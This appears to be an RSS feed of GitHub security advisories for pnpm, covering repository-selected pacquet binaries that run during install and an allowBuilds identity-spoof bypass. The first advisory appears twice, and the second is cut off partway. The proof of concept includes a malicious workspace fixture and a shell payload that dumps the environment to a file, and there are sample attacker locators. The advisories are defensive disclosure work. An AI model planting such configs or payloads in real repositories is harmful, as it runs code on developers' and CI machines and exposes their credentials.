<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-06-26T23:23:10.720Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: Repository-controlled configDependencies can select a pacquet native install engine]]></title>
        <id>https://github.com/advisories/GHSA-gj8w-mvpf-x27x</id>
        <link href="https://github.com/advisories/GHSA-gj8w-mvpf-x27x"/>
        <updated>2026-06-26T23:20:48.000Z</updated>
        <content type="html"><![CDATA[<h2 id="maintainer-action-plan">Maintainer Action Plan</h2>
<p>This report is ready to review with the shared patch branch. Start with the PR and the expected fixed behavior, then use the detailed exploit narrative below only if you want to replay the original path.</p>
<ul>
<li>Advisory: <code>CAND-PNPM-097</code> / <code>GHSA-gj8w-mvpf-x27x</code></li>
<li>Advisory URL: <a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-gj8w-mvpf-x27x">https://github.com/pnpm/pnpm/security/advisories/GHSA-gj8w-mvpf-x27x</a></li>
<li>Shared patch PR: <a href="https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1">https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1</a></li>
<li>Shared patch branch: <code>security/ghsa-batch-2026-06-09</code></li>
<li>Patch commit: <code>a93449314f398cf4bdf2e28d033c02d37395ad22</code></li>
<li>Base commit: <code>origin/main</code> <code>55a4035abf1ae3fe7208ba1f5ef43c5eff58ccec</code></li>
<li>Maintainer priority: <code>start-here</code></li>
<li>Component: <code>pnpm configDependencies / pacquet delegation</code></li>
<li>Patch area: pacquet/configDependency lifecycle execution is not used as install engine without trust</li>
<li>Affected packages: <code>npm:pnpm</code>, <code>npm:@pnpm/config.reader</code>, <code>npm:@pnpm/installing.commands</code></li>
<li>CWE IDs: <code>CWE-829</code>, <code>CWE-78</code>, <code>CWE-494</code></li>
<li>Conservative CVSS: <code>7.5</code> / <code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H</code></li>
<li>Next action: review the shared patch branch for this component, set the final affected version range, merge and release the fix, then publish or close the advisory.</li>
</ul>
<h3 id="expected-patched-behavior">Expected Patched Behavior</h3>
<p>config-dependency pacquet install engines are not selected unless the trusted allowlist is set outside the repository; the marker file is not created.</p>
<h3 id="files-and-tests-to-review">Files And Tests To Review</h3>
<ul>
<li><code>config/reader/src/Config.ts</code></li>
<li><code>config/reader/src/types.ts</code></li>
<li><code>config/reader/src/configFileKey.ts</code></li>
<li><code>config/reader/src/index.ts</code></li>
<li><code>config/reader/test/index.ts</code></li>
<li><code>installing/commands/src/installDeps.ts</code></li>
<li><code>installing/commands/test/runPacquet.ts</code></li>
<li><code>pnpm/test/install/pacquet.ts</code></li>
<li><code>.changeset/lucky-config-plugin-pnpmfiles.md</code></li>
</ul>
<h3 id="focused-validation">Focused Validation</h3>
<p>Run these from a checkout of the shared patch branch. They are the useful maintainer commands with machine-local artifact paths removed.</p>
<pre><code class="language-bash">./node_modules/.bin/tsgo --build config/reader/tsconfig.json
./node_modules/.bin/tsgo --build installing/commands/tsconfig.json
./node_modules/.bin/tsgo --build pnpm/tsconfig.json
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/runPacquet.ts --runInBand
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/index.ts -t "config dependency code allowlists|user-level preference settings" --runInBand
./node_modules/.bin/eslint config/reader/src/Config.ts config/reader/src/types.ts config/reader/src/configFileKey.ts config/reader/src/index.ts config/reader/test/index.ts installing/commands/src/installDeps.ts installing/commands/test/runPacquet.ts pnpm/test/install/pacquet.ts
git diff --check
</code></pre>
<p>The full patched replay for the shared branch passed with all 20 candidates marked fixed. This candidate's replay evidence is <code>results/CAND-PNPM-097-patched-result.json</code>.</p>


<h3 id="summary">Summary</h3>
<p>pnpm can install <code>configDependencies</code> declared in <code>pnpm-workspace.yaml</code> before command dispatch. Before the patch, a repository could declare <code>pacquet</code> or <code>@pnpm/pacquet</code> as a config dependency and pnpm treated that repository-controlled dependency as an install-engine opt-in. During install, pnpm resolved a platform-specific <code>@pacquet/&lt;platform&gt;-&lt;arch&gt;/pacquet</code> binary from <code>node_modules/.pnpm-config/&lt;packageName&gt;</code> and spawned it as the developer or CI user.</p>
<h3 id="details">Details</h3>
<p>The vulnerable source-to-sink path was:</p>
<ul>
<li><code>config/reader/src/getOptionsFromRootManifest.ts</code> copies repository <code>pnpm-workspace.yaml</code> <code>configDependencies</code> into config.</li>
<li><code>pnpm/src/getConfig.ts</code> installs config dependencies before command dispatch.</li>
<li><code>installing/env-installer/src/resolveAndInstallConfigDeps.ts</code> resolves the repository-declared dependency and its optional platform subdependencies.</li>
<li><code>installing/env-installer/src/installConfigDeps.ts</code> fetches, imports, and symlinks the config dependency tree under <code>node_modules/.pnpm-config</code>.</li>
<li><code>installing/commands/src/installDeps.ts</code> selected pacquet delegation whenever <code>configDependencies</code> contained <code>pacquet</code> or <code>@pnpm/pacquet</code>.</li>
<li><code>installing/deps-installer/src/install/index.ts</code> called <code>opts.runPacquet</code> from frozen and materialization paths.</li>
<li><code>installing/commands/src/runPacquet.ts</code> resolved <code>@pacquet/${process.platform}-${process.arch}/pacquet</code> from the installed config dependency package and executed it with <code>spawn()</code>.</li>
</ul>
<p>Exact-version, integrity, and platform filters only proved which bytes package resolution selected; they did not establish that the repository was trusted to choose a native install engine.</p>
<h3 id="poc">PoC</h3>
<p>Standalone PoC and verification script:</p>
<p>Repository fixture:</p>
<pre><code class="language-yaml">packages:
  - .
configDependencies:
  pacquet: 0.2.2
</code></pre>
<p>Registry package shape:</p>
<pre><code class="language-json">{
  "name": "pacquet",
  "version": "0.2.2",
  "optionalDependencies": {
    "@pacquet/darwin-arm64": "0.2.2"
  }
}
</code></pre>
<p>Platform package payload:</p>
<pre><code class="language-sh">#!/bin/sh
echo "$PWD" &gt; /tmp/pacquet-engine-ran
env &gt; /tmp/pacquet-engine-env
</code></pre>
<p>Pre-patch exploit model:</p>
<ol>
<li>The victim runs a dependency-management command such as <code>pnpm install</code> in the repository.</li>
<li>pnpm installs the repository-declared config dependency and its host-compatible optional platform dependency into <code>.pnpm-config</code>.</li>
<li><code>installDeps()</code> treats the presence of <code>configDependencies.pacquet</code> or <code>configDependencies["@pnpm/pacquet"]</code> as authorization to delegate install materialization.</li>
<li><code>runPacquet()</code> resolves the platform binary from the installed config dependency tree and spawns it in the lockfile directory.</li>
</ol>
<p>Observed PoC output:</p>
<pre><code class="language-json">{
  "primitive": "repository-selected pacquet config dependency reaches native process execution when selected",
  "patchedWithoutAllowlist": "blocked",
  "trustedAllowlist": "allows explicit opt-in"
}
</code></pre>
<p>Focused validation commands:</p>
<pre><code class="language-bash">./node_modules/.bin/tsgo --build config/reader/tsconfig.json
./node_modules/.bin/tsgo --build installing/commands/tsconfig.json
./node_modules/.bin/tsgo --build pnpm/tsconfig.json
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/runPacquet.ts --runInBand
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/index.ts -t "config dependency code allowlists|user-level preference settings" --runInBand
./node_modules/.bin/eslint config/reader/src/Config.ts config/reader/src/types.ts config/reader/src/configFileKey.ts config/reader/src/index.ts config/reader/test/index.ts installing/commands/src/installDeps.ts installing/commands/test/runPacquet.ts pnpm/test/install/pacquet.ts
git diff --check
</code></pre>
<p>Validation result:</p>
<ul>
<li>The PoC confirmed a selected pacquet config dependency reaches native process execution.</li>
<li>Patched <code>getPacquetConfigDependencyName()</code> returns <code>undefined</code> without a trusted allowlist.</li>
<li>Patched <code>getPacquetConfigDependencyName()</code> allows exact <code>pacquet</code>, exact <code>@pnpm/pacquet</code>, and wildcard <code>*</code> trusted opt-in.</li>
<li>Config reader regressions prove user/global config can set <code>configDependencyInstallEngineAllowlist</code>, while <code>pnpm-workspace.yaml</code> cannot grant this permission to itself.</li>
<li>E2E fixtures that intentionally delegate to pacquet now pass the trusted allowlist through environment config.</li>
<li>TypeScript builds passed for <code>@pnpm/config.reader</code>, <code>@pnpm/installing.commands</code>, and <code>pnpm</code>.</li>
<li>Focused <code>installing/commands/test/runPacquet.ts</code>: 3 passed.</li>
<li>Focused <code>config/reader/test/index.ts</code>: 2 passed, 132 skipped under the focused pattern.</li>
<li>ESLint passed with warnings only for existing skipped tests in <code>config/reader/test/index.ts</code> and <code>pnpm/test/install/pacquet.ts</code>.</li>
<li><code>git diff --check</code>: passed.</li>
</ul>
<h3 id="impact">Impact</h3>
<p>A malicious repository can cause pnpm to execute a registry-selected native binary while handling dependency-management commands. The binary runs with the victim developer or CI user's filesystem, environment, registry credentials, git/SSH credentials, and network access.</p>
<h2 id="affected-products">Affected products</h2>
<p>Ecosystem: npm</p>
<p>Package name: <code>pnpm</code>, <code>@pnpm/config.reader</code>, <code>@pnpm/installing.commands</code></p>
<p>Affected versions: current main before this patch, when <code>configDependencies</code> contains <code>pacquet</code> or <code>@pnpm/pacquet</code> and install paths delegate to pacquet.</p>
<p>Patched versions: 10.34.2, 11.5.3.</p>
<h2 id="severity">Severity</h2>
<p>Severity: High</p>
<p>Vector string: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code></p>
<p>Base score: 8.8</p>
<p>Rationale: attacker input is delivered through a repository and registry package, exploitation is low complexity once the victim runs pnpm, no attacker privileges are required, and user interaction is required. Successful exploitation executes a native binary in the victim user's context, with high confidentiality, integrity, and availability impact.</p>
<h2 id="weaknesses">Weaknesses</h2>
<p>CWE-829: Inclusion of Functionality from Untrusted Control Sphere</p>
<p>CWE-78: Improper Neutralization of Special Elements used in an OS Command</p>
<p>CWE-494: Download of Code Without Integrity Check</p>
<h2 id="patch">Patch</h2>
<p>The patch adds a trusted opt-in gate for config-dependency install-engine delegation:</p>
<ul>
<li>New setting: <code>configDependencyInstallEngineAllowlist</code>.</li>
<li>The allowlist can be set from trusted user-controlled config such as global config, CLI config, or environment config.</li>
<li><code>pnpm-workspace.yaml</code> cannot grant this permission to itself; workspace-provided values are discarded after workspace settings are merged.</li>
<li><code>installDeps()</code> delegates to pacquet only when <code>pacquet</code>, <code>@pnpm/pacquet</code>, or <code>*</code> is present in the trusted allowlist.</li>
<li>Repositories can still install <code>pacquet</code> as a config dependency, but pnpm will not spawn it as an install engine unless trusted config opts in.</li>
<li>Existing tests that intentionally exercise pacquet delegation were updated to pass the trusted allowlist via environment config.</li>
</ul>
<p>Changed files:</p>
<ul>
<li><code>config/reader/src/Config.ts</code></li>
<li><code>config/reader/src/types.ts</code></li>
<li><code>config/reader/src/configFileKey.ts</code></li>
<li><code>config/reader/src/index.ts</code></li>
<li><code>config/reader/test/index.ts</code></li>
<li><code>installing/commands/src/installDeps.ts</code></li>
<li><code>installing/commands/test/runPacquet.ts</code></li>
<li><code>pnpm/test/install/pacquet.ts</code></li>
</ul>
<p>Changeset:</p>
<ul>
<li><code>.changeset/lucky-config-plugin-pnpmfiles.md</code></li>
</ul>
<p>Pacquet parity:</p>
<p>No pacquet-side code-execution sink exists for this finding. The Rust port parses and records <code>configDependencies</code> for workspace-state compatibility, but it does not install config dependencies or select/spawn an alternate install engine from them. The user-visible trust setting is TypeScript-side today because it gates pnpm's pacquet delegation path.</p>
<h2 id="cvss-reassessment">CVSS Reassessment</h2>
<p>Initial CVSS remains correct for vulnerable versions: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code> / 8.8 High.</p>
<p>Final CVSS after patch: not vulnerable after patch / 0.0. The PoC no longer reaches pacquet install-engine selection or native process execution unless the victim has set a trusted allowlist outside the repository's own workspace settings.</p>
<h2 id="remaining-risk">Remaining Risk</h2>
<p>Users can explicitly trust pacquet install-engine delegation through the new allowlist. That is intentional behavior; the closed issue is repository self-authorization of a registry-provided native install engine.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-gj8w-mvpf-x27x">https://github.com/pnpm/pnpm/security/advisories/GHSA-gj8w-mvpf-x27x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55697">https://nvd.nist.gov/vuln/detail/CVE-2026-55697</a></li>
<li><a href="https://github.com/advisories/GHSA-gj8w-mvpf-x27x">https://github.com/advisories/GHSA-gj8w-mvpf-x27x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gj8w-mvpf-x27x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-26T23:20:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: Repository-controlled configDependencies can select a pacquet native install engine]]></title>
        <id>https://github.com/advisories/GHSA-gj8w-mvpf-x27x</id>
        <link href="https://github.com/advisories/GHSA-gj8w-mvpf-x27x"/>
        <updated>2026-06-26T23:20:48.000Z</updated>
        <content type="html"><![CDATA[<h2 id="maintainer-action-plan">Maintainer Action Plan</h2>
<p>This report is ready to review with the shared patch branch. Start with the PR and the expected fixed behavior, then use the detailed exploit narrative below only if you want to replay the original path.</p>
<ul>
<li>Advisory: <code>CAND-PNPM-097</code> / <code>GHSA-gj8w-mvpf-x27x</code></li>
<li>Advisory URL: <a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-gj8w-mvpf-x27x">https://github.com/pnpm/pnpm/security/advisories/GHSA-gj8w-mvpf-x27x</a></li>
<li>Shared patch PR: <a href="https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1">https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1</a></li>
<li>Shared patch branch: <code>security/ghsa-batch-2026-06-09</code></li>
<li>Patch commit: <code>a93449314f398cf4bdf2e28d033c02d37395ad22</code></li>
<li>Base commit: <code>origin/main</code> <code>55a4035abf1ae3fe7208ba1f5ef43c5eff58ccec</code></li>
<li>Maintainer priority: <code>start-here</code></li>
<li>Component: <code>pnpm configDependencies / pacquet delegation</code></li>
<li>Patch area: pacquet/configDependency lifecycle execution is not used as install engine without trust</li>
<li>Affected packages: <code>npm:pnpm</code>, <code>npm:@pnpm/config.reader</code>, <code>npm:@pnpm/installing.commands</code></li>
<li>CWE IDs: <code>CWE-829</code>, <code>CWE-78</code>, <code>CWE-494</code></li>
<li>Conservative CVSS: <code>7.5</code> / <code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H</code></li>
<li>Next action: review the shared patch branch for this component, set the final affected version range, merge and release the fix, then publish or close the advisory.</li>
</ul>
<h3 id="expected-patched-behavior">Expected Patched Behavior</h3>
<p>config-dependency pacquet install engines are not selected unless the trusted allowlist is set outside the repository; the marker file is not created.</p>
<h3 id="files-and-tests-to-review">Files And Tests To Review</h3>
<ul>
<li><code>config/reader/src/Config.ts</code></li>
<li><code>config/reader/src/types.ts</code></li>
<li><code>config/reader/src/configFileKey.ts</code></li>
<li><code>config/reader/src/index.ts</code></li>
<li><code>config/reader/test/index.ts</code></li>
<li><code>installing/commands/src/installDeps.ts</code></li>
<li><code>installing/commands/test/runPacquet.ts</code></li>
<li><code>pnpm/test/install/pacquet.ts</code></li>
<li><code>.changeset/lucky-config-plugin-pnpmfiles.md</code></li>
</ul>
<h3 id="focused-validation">Focused Validation</h3>
<p>Run these from a checkout of the shared patch branch. They are the useful maintainer commands with machine-local artifact paths removed.</p>
<pre><code class="language-bash">./node_modules/.bin/tsgo --build config/reader/tsconfig.json
./node_modules/.bin/tsgo --build installing/commands/tsconfig.json
./node_modules/.bin/tsgo --build pnpm/tsconfig.json
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/runPacquet.ts --runInBand
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/index.ts -t "config dependency code allowlists|user-level preference settings" --runInBand
./node_modules/.bin/eslint config/reader/src/Config.ts config/reader/src/types.ts config/reader/src/configFileKey.ts config/reader/src/index.ts config/reader/test/index.ts installing/commands/src/installDeps.ts installing/commands/test/runPacquet.ts pnpm/test/install/pacquet.ts
git diff --check
</code></pre>
<p>The full patched replay for the shared branch passed with all 20 candidates marked fixed. This candidate's replay evidence is <code>results/CAND-PNPM-097-patched-result.json</code>.</p>


<h3 id="summary">Summary</h3>
<p>pnpm can install <code>configDependencies</code> declared in <code>pnpm-workspace.yaml</code> before command dispatch. Before the patch, a repository could declare <code>pacquet</code> or <code>@pnpm/pacquet</code> as a config dependency and pnpm treated that repository-controlled dependency as an install-engine opt-in. During install, pnpm resolved a platform-specific <code>@pacquet/&lt;platform&gt;-&lt;arch&gt;/pacquet</code> binary from <code>node_modules/.pnpm-config/&lt;packageName&gt;</code> and spawned it as the developer or CI user.</p>
<h3 id="details">Details</h3>
<p>The vulnerable source-to-sink path was:</p>
<ul>
<li><code>config/reader/src/getOptionsFromRootManifest.ts</code> copies repository <code>pnpm-workspace.yaml</code> <code>configDependencies</code> into config.</li>
<li><code>pnpm/src/getConfig.ts</code> installs config dependencies before command dispatch.</li>
<li><code>installing/env-installer/src/resolveAndInstallConfigDeps.ts</code> resolves the repository-declared dependency and its optional platform subdependencies.</li>
<li><code>installing/env-installer/src/installConfigDeps.ts</code> fetches, imports, and symlinks the config dependency tree under <code>node_modules/.pnpm-config</code>.</li>
<li><code>installing/commands/src/installDeps.ts</code> selected pacquet delegation whenever <code>configDependencies</code> contained <code>pacquet</code> or <code>@pnpm/pacquet</code>.</li>
<li><code>installing/deps-installer/src/install/index.ts</code> called <code>opts.runPacquet</code> from frozen and materialization paths.</li>
<li><code>installing/commands/src/runPacquet.ts</code> resolved <code>@pacquet/${process.platform}-${process.arch}/pacquet</code> from the installed config dependency package and executed it with <code>spawn()</code>.</li>
</ul>
<p>Exact-version, integrity, and platform filters only proved which bytes package resolution selected; they did not establish that the repository was trusted to choose a native install engine.</p>
<h3 id="poc">PoC</h3>
<p>Standalone PoC and verification script:</p>
<p>Repository fixture:</p>
<pre><code class="language-yaml">packages:
  - .
configDependencies:
  pacquet: 0.2.2
</code></pre>
<p>Registry package shape:</p>
<pre><code class="language-json">{
  "name": "pacquet",
  "version": "0.2.2",
  "optionalDependencies": {
    "@pacquet/darwin-arm64": "0.2.2"
  }
}
</code></pre>
<p>Platform package payload:</p>
<pre><code class="language-sh">#!/bin/sh
echo "$PWD" &gt; /tmp/pacquet-engine-ran
env &gt; /tmp/pacquet-engine-env
</code></pre>
<p>Pre-patch exploit model:</p>
<ol>
<li>The victim runs a dependency-management command such as <code>pnpm install</code> in the repository.</li>
<li>pnpm installs the repository-declared config dependency and its host-compatible optional platform dependency into <code>.pnpm-config</code>.</li>
<li><code>installDeps()</code> treats the presence of <code>configDependencies.pacquet</code> or <code>configDependencies["@pnpm/pacquet"]</code> as authorization to delegate install materialization.</li>
<li><code>runPacquet()</code> resolves the platform binary from the installed config dependency tree and spawns it in the lockfile directory.</li>
</ol>
<p>Observed PoC output:</p>
<pre><code class="language-json">{
  "primitive": "repository-selected pacquet config dependency reaches native process execution when selected",
  "patchedWithoutAllowlist": "blocked",
  "trustedAllowlist": "allows explicit opt-in"
}
</code></pre>
<p>Focused validation commands:</p>
<pre><code class="language-bash">./node_modules/.bin/tsgo --build config/reader/tsconfig.json
./node_modules/.bin/tsgo --build installing/commands/tsconfig.json
./node_modules/.bin/tsgo --build pnpm/tsconfig.json
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/runPacquet.ts --runInBand
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/index.ts -t "config dependency code allowlists|user-level preference settings" --runInBand
./node_modules/.bin/eslint config/reader/src/Config.ts config/reader/src/types.ts config/reader/src/configFileKey.ts config/reader/src/index.ts config/reader/test/index.ts installing/commands/src/installDeps.ts installing/commands/test/runPacquet.ts pnpm/test/install/pacquet.ts
git diff --check
</code></pre>
<p>Validation result:</p>
<ul>
<li>The PoC confirmed a selected pacquet config dependency reaches native process execution.</li>
<li>Patched <code>getPacquetConfigDependencyName()</code> returns <code>undefined</code> without a trusted allowlist.</li>
<li>Patched <code>getPacquetConfigDependencyName()</code> allows exact <code>pacquet</code>, exact <code>@pnpm/pacquet</code>, and wildcard <code>*</code> trusted opt-in.</li>
<li>Config reader regressions prove user/global config can set <code>configDependencyInstallEngineAllowlist</code>, while <code>pnpm-workspace.yaml</code> cannot grant this permission to itself.</li>
<li>E2E fixtures that intentionally delegate to pacquet now pass the trusted allowlist through environment config.</li>
<li>TypeScript builds passed for <code>@pnpm/config.reader</code>, <code>@pnpm/installing.commands</code>, and <code>pnpm</code>.</li>
<li>Focused <code>installing/commands/test/runPacquet.ts</code>: 3 passed.</li>
<li>Focused <code>config/reader/test/index.ts</code>: 2 passed, 132 skipped under the focused pattern.</li>
<li>ESLint passed with warnings only for existing skipped tests in <code>config/reader/test/index.ts</code> and <code>pnpm/test/install/pacquet.ts</code>.</li>
<li><code>git diff --check</code>: passed.</li>
</ul>
<h3 id="impact">Impact</h3>
<p>A malicious repository can cause pnpm to execute a registry-selected native binary while handling dependency-management commands. The binary runs with the victim developer or CI user's filesystem, environment, registry credentials, git/SSH credentials, and network access.</p>
<h2 id="affected-products">Affected products</h2>
<p>Ecosystem: npm</p>
<p>Package name: <code>pnpm</code>, <code>@pnpm/config.reader</code>, <code>@pnpm/installing.commands</code></p>
<p>Affected versions: current main before this patch, when <code>configDependencies</code> contains <code>pacquet</code> or <code>@pnpm/pacquet</code> and install paths delegate to pacquet.</p>
<p>Patched versions: 10.34.2, 11.5.3.</p>
<h2 id="severity">Severity</h2>
<p>Severity: High</p>
<p>Vector string: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code></p>
<p>Base score: 8.8</p>
<p>Rationale: attacker input is delivered through a repository and registry package, exploitation is low complexity once the victim runs pnpm, no attacker privileges are required, and user interaction is required. Successful exploitation executes a native binary in the victim user's context, with high confidentiality, integrity, and availability impact.</p>
<h2 id="weaknesses">Weaknesses</h2>
<p>CWE-829: Inclusion of Functionality from Untrusted Control Sphere</p>
<p>CWE-78: Improper Neutralization of Special Elements used in an OS Command</p>
<p>CWE-494: Download of Code Without Integrity Check</p>
<h2 id="patch">Patch</h2>
<p>The patch adds a trusted opt-in gate for config-dependency install-engine delegation:</p>
<ul>
<li>New setting: <code>configDependencyInstallEngineAllowlist</code>.</li>
<li>The allowlist can be set from trusted user-controlled config such as global config, CLI config, or environment config.</li>
<li><code>pnpm-workspace.yaml</code> cannot grant this permission to itself; workspace-provided values are discarded after workspace settings are merged.</li>
<li><code>installDeps()</code> delegates to pacquet only when <code>pacquet</code>, <code>@pnpm/pacquet</code>, or <code>*</code> is present in the trusted allowlist.</li>
<li>Repositories can still install <code>pacquet</code> as a config dependency, but pnpm will not spawn it as an install engine unless trusted config opts in.</li>
<li>Existing tests that intentionally exercise pacquet delegation were updated to pass the trusted allowlist via environment config.</li>
</ul>
<p>Changed files:</p>
<ul>
<li><code>config/reader/src/Config.ts</code></li>
<li><code>config/reader/src/types.ts</code></li>
<li><code>config/reader/src/configFileKey.ts</code></li>
<li><code>config/reader/src/index.ts</code></li>
<li><code>config/reader/test/index.ts</code></li>
<li><code>installing/commands/src/installDeps.ts</code></li>
<li><code>installing/commands/test/runPacquet.ts</code></li>
<li><code>pnpm/test/install/pacquet.ts</code></li>
</ul>
<p>Changeset:</p>
<ul>
<li><code>.changeset/lucky-config-plugin-pnpmfiles.md</code></li>
</ul>
<p>Pacquet parity:</p>
<p>No pacquet-side code-execution sink exists for this finding. The Rust port parses and records <code>configDependencies</code> for workspace-state compatibility, but it does not install config dependencies or select/spawn an alternate install engine from them. The user-visible trust setting is TypeScript-side today because it gates pnpm's pacquet delegation path.</p>
<h2 id="cvss-reassessment">CVSS Reassessment</h2>
<p>Initial CVSS remains correct for vulnerable versions: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code> / 8.8 High.</p>
<p>Final CVSS after patch: not vulnerable after patch / 0.0. The PoC no longer reaches pacquet install-engine selection or native process execution unless the victim has set a trusted allowlist outside the repository's own workspace settings.</p>
<h2 id="remaining-risk">Remaining Risk</h2>
<p>Users can explicitly trust pacquet install-engine delegation through the new allowlist. That is intentional behavior; the closed issue is repository self-authorization of a registry-provided native install engine.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-gj8w-mvpf-x27x">https://github.com/pnpm/pnpm/security/advisories/GHSA-gj8w-mvpf-x27x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55697">https://nvd.nist.gov/vuln/detail/CVE-2026-55697</a></li>
<li><a href="https://github.com/advisories/GHSA-gj8w-mvpf-x27x">https://github.com/advisories/GHSA-gj8w-mvpf-x27x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gj8w-mvpf-x27x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-26T23:20:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: Manifest identity spoof satisfies allowBuilds and runs attacker lifecycle]]></title>
        <id>https://github.com/advisories/GHSA-5wx6-mg75-v57r</id>
        <link href="https://github.com/advisories/GHSA-5wx6-mg75-v57r"/>
        <updated>2026-06-26T23:18:14.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Keep build approval for opaque dependency sources byte-exact for GHSA-5wx6-mg75-v57r / CAND-PNPM-123.</p>
<p>Merged upstream commit <code>bf1b731ee6</code> fixed the original name-only approval bypass by making build policy consume the resolved dependency identity. One collision remained: the generic peer-suffix normalizer also stripped parenthesized text from git, URL, tarball, file, and other opaque locators. Approval for one source string could therefore authorize a different attacker-controlled source whose locator normalized to the same value.</p>
<h2 id="security-boundary">Security boundary</h2>
<ul>
<li>Registry dependency identities still normalize legitimate peer suffixes and retain patch hashes.</li>
<li>Git, URL, tarball, file, directory, and otherwise opaque identities must match the complete resolved locator byte for byte.</li>
<li>Explicit denials use the same normalization as approvals.</li>
<li>Ignored-build output preserves the exact opaque identity, so the key pnpm asks a user to approve is the key policy later checks.</li>
<li>TypeScript pnpm and pacquet implement the same distinction between registry and opaque identities.</li>
</ul>
<h2 id="exploit-replay">Exploit replay</h2>
<ul>
<li>With <code>allowBuilds</code> approving <code>foo@https://host/pkg.tgz</code>, the upstream implementation also accepted <code>foo@https://host/pkg.tgz(evil)</code> because both passed through peer-suffix removal.</li>
<li>An independent review found a second Rust-only form: <code>foo@https://host/pkg@1.0.0(good)</code> and <code>foo@https://host/pkg@1.0.0(evil)</code> collided because the parser selected the final <code>@</code> and misclassified the opaque URL as a registry package.</li>
<li>A final review found the same parser hazard in source-only locators ending in a semver-looking tail: approval for <code>https://host/pkg@1.0.0</code> could collapse <code>https://host/pkg@1.0.0(evil)</code>.</li>
<li>The final patch rejects all three collision forms, applies the same exactness to deny rules, accepts exact opaque keys as positive controls, and continues to accept registry packages approved without their peer suffixes.</li>
</ul>
<h2 id="files-changed">Files changed</h2>
<ul>
<li><code>building/policy/src/index.ts</code> and <code>building/policy/test/index.ts</code> normalize only parsed registry identities and retain exact opaque keys.</li>
<li><code>pacquet/crates/package-manager/src/build_modules.rs</code> passes snapshot identities to policy, matches TypeScript package-separator parsing, and preserves opaque locators.</li>
<li><code>pacquet/crates/package-manager/src/build_modules/tests.rs</code> covers exact approval and denial, all three collision forms, ignored-build output, and registry peer compatibility.</li>
<li><code>.changeset/quiet-opaque-build-identities.md</code> records patch releases for <code>@pnpm/building.policy</code> and <code>pnpm</code>.</li>
</ul>
<h2 id="commands-run">Commands run</h2>
<pre><code class="language-text">$ jest building/policy/test/index.ts --runInBand
16 passed
$ cargo test -p pacquet-package-manager build_modules::tests -- --nocapture
49 passed
$ cargo fmt --all -- --check
PASS
$ git diff --check 84bb4b1a046f3a659de1c9aab1d45dcf814124ce...HEAD
PASS
</code></pre>
<h2 id="validation">Validation</h2>
<ul>
<li>The TypeScript policy suite passed all 16 tests.</li>
<li>The final pacquet build-policy suite passed all 49 tests.</li>
<li>The new Rust regression reproduced the extra-<code>@</code> collision before the additive fix and passed afterward.</li>
<li>Exact opaque approval and denial, source-only semver-tail collision rejection, registry peer normalization, and ignored-build reporting all have paired tests.</li>
<li>ESLint passed on the changed TypeScript source and test files.</li>
<li>Rust formatting and diff checks passed; the branch is clean and consists of three focused security commits plus additive merges of upstream through <code>84bb4b1a046f3a659de1c9aab1d45dcf814124ce</code>.</li>
